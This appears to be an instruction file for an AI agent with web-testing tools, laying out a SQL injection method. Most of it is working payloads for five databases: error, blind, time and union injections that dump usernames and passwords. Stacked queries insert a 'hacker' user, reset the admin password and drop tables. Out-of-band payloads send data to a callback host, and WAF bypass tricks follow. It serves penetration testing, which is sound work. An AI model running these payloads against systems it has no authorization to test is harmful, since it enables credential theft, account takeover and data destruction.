# SQL Injection Detection Skill

## Objective
Identify and confirm SQL injection vulnerabilities in web applications by testing all input vectors with database-specific payloads.

## Instructions

### 1. Identify Injection Points
Use `params_extract` to enumerate all input vectors:
- Query string parameters (GET)
- POST body parameters (form data, JSON, XML)
- HTTP headers (User-Agent, Referer, Cookie, X-Forwarded-For)
- Path parameters (/api/users/{id})
- JSON/XML nested fields

### 2. Entry Point Detection
Test with basic payloads to identify potential injection points:
```
'
"
`
')
")
`)
'))
"))
```

### 3. DBMS Identification
Use error-based or behavioral fingerprinting:

**Error-based identification:**
- MySQL: `' AND 1=CONVERT(int,@@version)--`
- PostgreSQL: `' AND 1=CAST(version() AS int)--`
- MSSQL: `' AND 1=CONVERT(int,@@version)--`
- Oracle: `' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--`
- SQLite: `' AND 1=sqlite_version()--`

**Behavioral fingerprinting:**
- MySQL: `SELECT @@version`, `SELECT version()`
- PostgreSQL: `SELECT version()`
- MSSQL: `SELECT @@version`
- Oracle: `SELECT * FROM v$version`

### 4. Injection Type Testing

**Boolean-based blind:**
```
' AND 1=1--
' AND 1=2--
' AND 'a'='a
' AND 'a'='b
1 AND 1=1
1 AND 1=2
```
Compare response lengths/content between true and false conditions.

**Error-based:**
```sql
-- MySQL
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- Oracle
' AND 1=UTL_INADDR.get_host_name((SELECT user FROM dual))--
```

**Time-based blind:**
```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=1; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

**Union-based:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--  -- Find column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
```

**Stacked queries:**
```sql
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; DROP TABLE users--  -- DANGEROUS: detection only!
```

**Out-of-band (OOB):**
Use `collaborator_generate` to create a callback URL, then:
```sql
-- MySQL (requires FILE privilege)
' AND LOAD_FILE(CONCAT('\\\\',@@version,'.COLLABORATOR_URL\\a'))--

-- MSSQL
'; EXEC master..xp_dirtree '\\COLLABORATOR_URL\a'--
'; EXEC master..xp_fileexist '\\COLLABORATOR_URL\a'--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR_URL'--

-- Oracle
' AND UTL_HTTP.REQUEST('http://COLLABORATOR_URL/'||(SELECT user FROM dual))=1--
```

### 5. WAF Bypass Techniques
If payloads are blocked, try:

**Encoding:**
- URL encode: `%27` for `'`
- Double URL: `%2527`
- Unicode: `%u0027`

**Case variation:**
- `SeLeCt`, `UNION`, `UnIoN`

**Comments:**
- MySQL: `/*!50000SELECT*/`
- Inline: `SEL/**/ECT`

**Whitespace alternatives:**
- `%09` (tab), `%0a` (newline), `%0d` (carriage return)
- `/**/` as space replacement

**Null bytes:**
- `%00` before payload

### 6. Confirm and Document
Use `http1_request` to verify the vulnerability with a clean PoC.

If confirmed, create finding with:
- Vulnerable parameter
- DBMS type
- Injection type (boolean, error, time, union, stacked, OOB)
- Proof of concept payload
- Evidence (response diff, error message, time delay)

## MCP Tools to Use
- `params_extract`: List all parameters
- `find_reflected`: Check for reflections
- `http1_request` / `http2_request`: Send test requests
- `repeater_tab_with_payload`: Send to Repeater for manual testing
- `intruder_prepare`: Automate payload testing
- `collaborator_generate` / `collaborator_poll`: OOB verification
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/SQL Injection
- OWASP Testing Guide - SQL Injection
